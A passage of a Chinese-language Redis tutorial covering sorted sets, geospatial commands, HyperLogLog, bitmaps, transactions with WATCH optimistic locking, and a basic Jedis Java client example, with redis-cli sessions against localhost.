显示薪资小于等于60的用户并附带薪资</span></span><br><span class="line">1) <span class="string">&quot;wangwu&quot;</span></span><br><span class="line">2) <span class="string">&quot;50&quot;</span></span><br><span class="line">3) <span class="string">&quot;zhangsan&quot;</span></span><br><span class="line">4) <span class="string">&quot;60&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; zadd salary 5000 zhangsan 6000 lisi 10000 wangwu 3000 zhaoliu</span><br><span class="line">(<span class="built_in">integer</span>) 4</span><br><span class="line">127.0.0.1:6379&gt; zrange salary 0 -1</span><br><span class="line">1) <span class="string">&quot;zhaoliu&quot;</span></span><br><span class="line">2) <span class="string">&quot;zhangsan&quot;</span></span><br><span class="line">3) <span class="string">&quot;lisi&quot;</span></span><br><span class="line">4) <span class="string">&quot;wangwu&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; zrem salary lisi <span class="comment"># 移除有序集合中的指定元素</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; zrange salary 0 -1</span><br><span class="line">1) <span class="string">&quot;zhaoliu&quot;</span></span><br><span class="line">2) <span class="string">&quot;zhangsan&quot;</span></span><br><span class="line">3) <span class="string">&quot;wangwu&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; zcard salary <span class="comment"># 获取有序集合中的个数</span></span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; zadd myset 1 a 2 b 3 c</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; zcount myset 1 3 <span class="comment"># 获取指定区间的成员数量！</span></span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; zcount myset 1 2</span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379&gt; zcount myset 2 3</span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br></pre></td></tr></table></figure>

<p>其余的一些api，可以去查询官方文档</p>
<p>案例思路：</p>
<ul>
<li><p>set 排序、存储班级成绩，工资表排序</p>
</li>
<li><p>加权：1-重要消息 0-普通消息</p>
</li>
<li><p>排行榜应用实现，取top 10</p>
</li>
</ul>
<h1 id="四、三种特殊数据类型"><a href="#四、三种特殊数据类型" class="headerlink" title="四、三种特殊数据类型"></a>四、三种特殊数据类型</h1><p>Redis在3.2版本中加入了地理空间(geospatial)以及索引半径查询的功能</p>
<p>主要用在需要地理位置的应用上</p>
<p>朋友的定位，附近的人，打车距离计算</p>
<p>查询城市经纬度：<a href="http://www.jsons.cn/lngcode/">http://www.jsons.cn/lngcode/</a></p>
<blockquote>
<p>geodd 功能说明: 将指定的地理空间位置（纬度、经度、名称）添加到指定的key中。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># getadd 添加地理位置</span></span><br><span class="line"><span class="comment"># 规则：两级无法直接添加，我们一般会下载城市数据，直接通过java程序一次性导入！</span></span><br><span class="line"><span class="comment"># 有效的经度从-180度到180度。 有效的纬度从-85.05112878度到85.05112878度。 当坐标位置超出上述指定范围时，该命令将会返回一个错误。</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; geoadd china:city 116.40 39.90 beijing</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; GEOADD china:city 121.47 31.23 shanghai</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; GEOADD china:city 120.15 30.28 hangzhou 106.50 29.53 chongqin 125.14 42.92 xian</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br></pre></td></tr></table></figure>

<blockquote>
<p>geopos   功能说明: 从key里返回所有给定位置元素的位置（经度和纬度）</p>
</blockquote>
<p>GEOPOS 命令返回一个数组， 数组中的每个项都由两个元素组成： 第一个元素为给定位置元素的经度， 而第二个元素则为给定位置元素的纬度。</p>
<p>当给定的位置元素不存在时， 对应的数组项为空值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; geopos china:city xian</span><br><span class="line">1) 1) <span class="string">&quot;125.13999849557876587&quot;</span></span><br><span class="line">   2) <span class="string">&quot;42.92000122112879268&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>geodist    两人之间的距离！</p>
</blockquote>
<p>功能说明</p>
<ul>
<li>返回两个给定位置之间的距离，如果两个位置之间的其中一个不存在， 那么命令返回空值</li>
<li>指定单位的参数 unit 必须是以下单位的其中一个<ul>
<li>m 表示单位为米（默认值）</li>
<li>km 表示单位为千米</li>
<li>mi 表示单位为英里</li>
<li>ft 表示单位为英尺</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; geodist china:city beijing shanghai</span><br><span class="line"><span class="string">&quot;1067378.7564&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; geodist china:city beijing shanghai km</span><br><span class="line"><span class="string">&quot;1067.3788&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>georadius   </p>
</blockquote>
<p>我附近的人？ （获得所有附近的人的地址，定位！）通过半径来查询！</p>
<p>以给定的经纬度为中心， 返回键包含的位置元素当中，与中心的距离不超过给定最大距离的所有位置元素</p>
<p>在给定以下可选项时， 命令会返回额外的信息：</p>
<ul>
<li><p>withdist</p>
<p>在返回位置元素的同时， 将位置元素与中心之间的距离也一并返回。 距离的单位和用户给定的范围单位保持一致。</p>
</li>
<li><p>withcoord</p>
<p>将位置元素的经度和维度也一并返回。</p>
</li>
<li><p>withhash</p>
<p>以 52 位有符号整数的形式， 返回位置元素经过原始 geohash 编码的有序集合分值。 这个选项主要用于底层应用或者调试， 实际中的作用并不大。 命令默认返回未排序的位置元素。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; georadius china:city 110 30 1000 km <span class="comment"># 以110，30 这个经纬度为中心，寻找方圆1000km内的城市</span></span><br><span class="line">1) <span class="string">&quot;chongqi&quot;</span></span><br><span class="line">2) <span class="string">&quot;hangzhou&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; georadius china:city 110 30 400 km</span><br><span class="line">1) <span class="string">&quot;chongqi&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; georadius china:city 110 30 400 km withdist <span class="comment"># 显示直线距离</span></span><br><span class="line">1) 1) <span class="string">&quot;chongqi&quot;</span></span><br><span class="line">   2) <span class="string">&quot;341.9374&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; georadius china:city 110 30 400 km withcoord <span class="comment"># 显示经纬度</span></span><br><span class="line">1) 1) <span class="string">&quot;chongqi&quot;</span></span><br><span class="line">   2) 1) <span class="string">&quot;106.49999767541885376&quot;</span></span><br><span class="line">      2) <span class="string">&quot;29.52999957900659211&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; georadius china:city 110 30 400 km withhash</span><br><span class="line">1) 1) <span class="string">&quot;chongqi&quot;</span></span><br><span class="line">   2) (<span class="built_in">integer</span>) 4026042091628984</span><br><span class="line">127.0.0.1:6379&gt; georadius china:city 110 30 400 km withcoord count 1 <span class="comment"># 筛选出指定数量的结果</span></span><br><span class="line">1) 1) <span class="string">&quot;chongqi&quot;</span></span><br><span class="line">   2) 1) <span class="string">&quot;106.49999767541885376&quot;</span></span><br><span class="line">      2) <span class="string">&quot;29.52999957900659211&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; georadius china:city 110 30 1000 km withcoord count 2</span><br><span class="line">1) 1) <span class="string">&quot;chongqi&quot;</span></span><br><span class="line">   2) 1) <span class="string">&quot;106.49999767541885376&quot;</span></span><br><span class="line">      2) <span class="string">&quot;29.52999957900659211&quot;</span></span><br><span class="line">2) 1) <span class="string">&quot;hangzhou&quot;</span></span><br><span class="line">   2) 1) <span class="string">&quot;120.15000075101852417&quot;</span></span><br><span class="line">      2) <span class="string">&quot;30.2800007575645509&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>georadiusbymember</p>
</blockquote>
<p>功能说明: 这个命令和 GEORADIUS 命令一样， 都可以找出位于指定范围内的元素， 但是 <strong>GEORADIUSBYMEMBER 的中心点是由给定的位置元素决定的</strong>， 而不是像 GEORADIUS 那样， 使用输入的经度和纬度来决定中心点指定成员的位置被用作查询的中心</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; GEORADIUSBYMEMBER china:city beijing 1000 km  <span class="comment"># 以北京为中心，附近1000米的城市</span></span><br><span class="line">1) <span class="string">&quot;beijing&quot;</span></span><br><span class="line">2) <span class="string">&quot;xian&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>geohash</p>
</blockquote>
<p>该命令将返回11个字符的Geohash字符串!</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将二维的经纬度转换为一维的字符串，如果两个字符串越接近，那么则距离越近！</span></span><br><span class="line">127.0.0.1:6379&gt; GEOHASH china:city beijing</span><br><span class="line">1) <span class="string">&quot;wx4fbxxfke0&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>geo底层的实现原理其实就是zset！我们可以使用zset命令来操作geo！</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; zrange china:city 0 -1 <span class="comment"># 查看全部的元素</span></span><br><span class="line">1) <span class="string">&quot;chongqi&quot;</span></span><br><span class="line">2) <span class="string">&quot;hangzhou&quot;</span></span><br><span class="line">3) <span class="string">&quot;shanghai&quot;</span></span><br><span class="line">4) <span class="string">&quot;beijing&quot;</span></span><br><span class="line">5) <span class="string">&quot;xian&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; zrem china:city xian <span class="comment"># 移除指定的元素</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; zrange china:city 0 -1</span><br><span class="line">1) <span class="string">&quot;chongqi&quot;</span></span><br><span class="line">2) <span class="string">&quot;hangzhou&quot;</span></span><br><span class="line">3) <span class="string">&quot;shanghai&quot;</span></span><br><span class="line">4) <span class="string">&quot;beijing&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>



<h2 id="2、hyperloglog"><a href="#2、hyperloglog" class="headerlink" title="2、hyperloglog"></a>2、hyperloglog</h2><blockquote>
<p>什么是基数</p>
</blockquote>
<p>比如数据集 {1, 3, 5, 7, 5, 7, 8}， 那么这个数据集的基数集为 {1, 3, 5 ,7, 8}, </p>
<p>基数(不重复元素)为5。 基数估计就是在误差可接受的范围内，快速计算基数。</p>
<blockquote>
<p>简介</p>
</blockquote>
<p>Redis 2.8.9 版本就更新了 Hyperloglog 数据结构！</p>
<p>Redis HyperLogLog 是用来做基数统计的算法，HyperLogLog 的优点是，在输入元素的数量或者体积非常非常大时，计算基数所需的空间总是固定的、并且是很小的。</p>
<p>在 Redis 里面，每个 HyperLogLog 键只需要花费 12 KB 内存，就可以计算接近 2^64 个不同元素的基 数。这和计算基数时，元素越多耗费内存就越多的集合形成鲜明对比。</p>
<p>但是，因为 HyperLogLog 只会根据输入元素来计算基数，而不会储存输入元素本身，所以 HyperLogLog 不能像集合那样，返回输入的各个元素。</p>
<p><strong>网页的UV 一个人访问一个网站多次，但是还是算作一个人！）</strong></p>
<p>传统的方式， set 保存用户的id，然后就可以统计 set 中的元素数量作为标准判断 !</p>
<p>这个方式如果保存大量的用户id，就会比较麻烦！我们的目的是为了计数，而不是保存用户id；</p>
<blockquote>
<p>测试使用</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; pfadd mykey a b c d e  <span class="comment"># 创建第一组元素 mykey</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; pfcount mykey <span class="comment"># 统计 mykey 元素的基数数量</span></span><br><span class="line">(<span class="built_in">integer</span>) 5</span><br><span class="line">127.0.0.1:6379&gt; pfadd mykey2 e d f g h k  <span class="comment"># 创建第二组元素 mykey2</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; pfcount mykey2</span><br><span class="line">(<span class="built_in">integer</span>) 6</span><br><span class="line">127.0.0.1:6379&gt; pfmerge mykey3 mykey mykey2 <span class="comment"># 合并两组 mykey mykey2 ---&gt; mykey3  并集</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; pfcount mykey3</span><br><span class="line">(<span class="built_in">integer</span>) 9</span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>

<p>0.81% 错误率！ 统计UV任务，可以忽略不计的！</p>
<p>如果允许容错，那么一定可以使用 Hyperloglog </p>
<p>如果不允许容错，就使用 set 或者自己的数据类型即可！</p>
<h2 id="3、bitmap"><a href="#3、bitmap" class="headerlink" title="3、bitmap"></a>3、bitmap</h2><p>BitMap 原本的含义是用一个比特位来映射某个元素的状态。由于一个比特位只能表示 0 和 1 两种状态，所以 BitMap 能映射的状态有限，但是使用比特位的优势是能大量的节省内存空间。</p>
<blockquote>
<p>应用场景</p>
</blockquote>
<ul>
<li>用户签到</li>
<li>统计活跃用户（用户登陆情况）</li>
<li>统计用户是否在线</li>
<li>实现布隆过滤器</li>
</ul>
<blockquote>
<p>测试</p>
</blockquote>
<p>使用bitmap 来记录 周一到周日的打卡！</p>
<p>7天打卡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; setbit sign 1 1</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; setbit sign 2 1</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; setbit sign 3 0</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; setbit sign 4 0</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; setbit sign 5 0</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; setbit sign 6 0</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; setbit sign 7 1</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br></pre></td></tr></table></figure>

<p>查看某一天的打开情况</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; getbit sign 1</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; getbit sign 2</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; getbit sign 4</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>统计操作，统计 打卡的天数！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; bitcount sign  <span class="comment"># 统计这周的打卡记录，就可以看到是否有全勤！</span></span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>



<h1 id="五、事务"><a href="#五、事务" class="headerlink" title="五、事务"></a>五、事务</h1><p>Redis 事务本质：一组命令的集合！ 一个事务中的所有命令都会被序列化，在事务执行过程的中，会按照顺序执行！</p>
<p>一次性、顺序性、排他性！执行一系列的命令！</p>
<p>Redis事务没有没有隔离级别的概念！</p>
<p>所有的命令在事务中，并没有直接被执行！只有发起执行命令的时候才会执行！<code>exec</code></p>
<p><strong>Redis单条命令式保证原子性的，但是事务不保证原子性！</strong></p>
<p>Redis 事务可以一次执行多个命令， 并且带有以下三个重要的保证：</p>
<ul>
<li>批量操作在发送 EXEC 命令前被放入队列缓存</li>
<li>收到 EXEC 命令后进入事务执行，事务中任意命令执行失败，其余的命令依然被执行</li>
<li>在事务执行过程，其他客户端提交的命令请求不会插入到事务执行命令序列中</li>
</ul>
<p>一个事务从开始到执行会经历以下三个阶段：</p>
<ul>
<li>开启事务（multi）</li>
<li>命令入队（……）</li>
<li>执行事务（exec）</li>
</ul>
<blockquote>
<p>正常执行事务</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; multi  <span class="comment"># 开启事务</span></span><br><span class="line">OK</span><br><span class="line"><span class="comment"># 命名入队</span></span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">set</span> k1 v1</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">set</span> k2 v2</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; get k2</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">set</span> k3 v3</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">exec</span> <span class="comment"># 执行事务</span></span><br><span class="line">1) OK</span><br><span class="line">2) OK</span><br><span class="line">3) <span class="string">&quot;v2&quot;</span></span><br><span class="line">4) OK</span><br></pre></td></tr></table></figure>

<blockquote>
<p>放弃事务</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">discard <span class="comment"># 取消事务</span></span><br><span class="line"><span class="comment"># 取消事务后，事务中的命令都不会去执行</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>编译型异常（代码有误！命令有误！）事务中所有的命令都不会执行</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; multi <span class="comment"># 开启事务</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">set</span> k1 v1</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">set</span> k2 v2</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">set</span> k3 v3</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; setget k3 <span class="comment"># 没有这个命令</span></span><br><span class="line">(error) ERR unknown <span class="built_in">command</span> <span class="string">&#x27;setget&#x27;</span>, with args beginning with: <span class="string">&#x27;k3&#x27;</span> </span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">exec</span> <span class="comment"># 执行事务报错！</span></span><br><span class="line">(error) EXECABORT Transaction discarded because of previous errors.</span><br><span class="line">127.0.0.1:6379&gt; get k1 <span class="comment"># 所有的命令都不会被执行！</span></span><br><span class="line">(nil)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>运行时异常，如果事务队列中存在语法性错误，那么执行命令的时候，其他命令是可以正常执行的，错误命令抛出错误</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> k1 v1</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; multi <span class="comment"># 开启事务</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379(TX)&gt; incr k1 <span class="comment"># 执行的时候会失败</span></span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">set</span> k2 v2</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">set</span> k3 v3</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; get k3</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">exec</span> <span class="comment"># 执行事务，虽然第一条命令报错了，但是后面的依旧正常执行成功了</span></span><br><span class="line">1) (error) ERR value is not an <span class="built_in">integer</span> or out of range</span><br><span class="line">2) OK</span><br><span class="line">3) OK</span><br><span class="line">4) <span class="string">&quot;v3&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; get k2</span><br><span class="line"><span class="string">&quot;v2&quot;</span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>监控 watch</p>
</blockquote>
<ul>
<li><p>悲观锁</p>
<p>很悲观，认为什么时候都会出问题，无论做什么都会加锁！</p>
</li>
<li><p>乐观锁</p>
<p>很乐观，认为什么时候都不会出问题，所以不会上锁，更新数据的时候去判断一下，再此期间是否有人修改过这个数据</p>
<p>获取version</p>
<p>更新的时候带上version条件</p>
</li>
</ul>
<blockquote>
<p>redis监视</p>
</blockquote>
<p>正常情况</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> money 100 <span class="comment"># 现在有100块钱</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> out 0 <span class="comment"># 花出去了0元</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; watch money <span class="comment"># 监视money</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; multi <span class="comment">#开启事务</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379(TX)&gt; decrby money 20 <span class="comment"># 花了20，余额-20</span></span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; incrby out 20 <span class="comment"># 花出去的钱+20</span></span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">exec</span> <span class="comment"># 执行事务</span></span><br><span class="line">1) (<span class="built_in">integer</span>) 80 <span class="comment"># 结果：余额还有80</span></span><br><span class="line">2) (<span class="built_in">integer</span>) 20 <span class="comment"># 结果：花出去了20</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>

<p>失败情况，模拟多线程修改值 , 使用watch 可以当做redis的乐观锁操作！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; watch money <span class="comment"># 监视money</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; multi <span class="comment"># 开启事务</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379(TX)&gt; decrby money 10 <span class="comment"># 又花了10，余额-10</span></span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; incrby out 10 <span class="comment"># 花出去的钱+10</span></span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="comment"># exec 这里暂时不执行事务</span></span><br></pre></td></tr></table></figure>

<p>在上面执行事务之前，另外一个线程又往money中充了100块</p>
<p>重新开启一个redis服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) <span class="string">&quot;out&quot;</span></span><br><span class="line">2) <span class="string">&quot;money&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; get money</span><br><span class="line"><span class="string">&quot;80&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; incrby money 100 <span class="comment"># 充了100，余额+100</span></span><br><span class="line">(<span class="built_in">integer</span>) 180</span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>

<p>回到原来的redis服务，执行事务，发现执行失败</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">exec</span> <span class="comment"># 执行之前，另外一个线程，修改了我们的值，这个时候，就会导致事务执行失 败！</span></span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/94ebcbefd366a9f975240c018c79ab71--6aec--image-20240921095731846.png" alt="image-20240921095731846"></p>
<p>如何解决这个问题呢？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; unwatch <span class="comment"># 1.如果发现事务执行失败，就先解锁</span></span><br><span class="line">127.0.0.1:6379&gt; watch money <span class="comment"># 2.获取最新的值，再次监视，select version</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; multi</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379(TX)&gt; decrby money 10</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; incrby out 10</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">exec</span> <span class="comment"># 对比监视的值是否发生了变化，如果没有变化，就可以执行成功，如果变了就执行失败</span></span><br><span class="line">1) (<span class="built_in">integer</span>) 170</span><br><span class="line">2) (<span class="built_in">integer</span>) 30</span><br></pre></td></tr></table></figure>



<h1 id="六、jedis"><a href="#六、jedis" class="headerlink" title="六、jedis"></a>六、jedis</h1><p>什么是Jedis 是 Redis 官方推荐的 java连接开发工具！ 使用Java 操作Redis 中间件！如果你要使用</p>
<p>java操作redis，那么一定要对Jedis 十分的熟悉！</p>
<blockquote>
<p>测试使用</p>
</blockquote>
<p>1、首先就是新建一个maven项目，导入对应所需要的依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/redis.clients/jedis --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>redis.clients<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jedis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2、由于我们是在windows上进行测试，所以我们可以开启windows的redis服务端去测试一下。</p>
<p>3、编写简单的代码去测试redis的连接</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.Jedis;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Jedis</span> <span class="variable">jedis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Jedis</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>);</span><br><span class="line">        System.out.println(jedis.ping());</span><br><span class="line">        jedis.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/31d26b20c93072dc06423796cb2898fb--370a--image-20240921134438489.png" alt="image-20240921134438489"></p>
<p>5、测试功能（简单使用一下事务功能）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> redis.clients.jedis.Jedis;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.Transaction;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 类描述</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: zyy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2023/04/20 17:02</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestTX</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//连接redis</span></span><br><span class="line">        <span class="type">Jedis</span> <span class="variable">jedis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Jedis</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>);</span><br><span class="line">        <span class="comment">//清空key</span></span><br><span class="line">        jedis.flushDB();</span><br><span class="line">        <span class="comment">//开启事务</span></span><br><span class="line">        <span class="type">Transaction</span> <span class="variable">multi</span> <span class="operator">=</span> jedis.multi();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            multi.set(<span class="string">&quot;k1&quot;</span>, <span class="string">&quot;v1&quot;</span>);</span><br><span class="line">            multi.set(<span class="string">&quot;k2&quot;</span>, <span class="string">&quot;v2&quot;</span>);</span><br><span class="line">            <span class="comment">//这里抛出异常，应该事务执行失败</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span> / <span class="number">0</span>;</span><br><span class="line">            <span class="comment">//执行事务</span></span><br><span class="line">            multi.exec();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">//放弃事务</span></span><br><span class="line">            multi.discard();</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//获取key对应的值</span></span><br><span 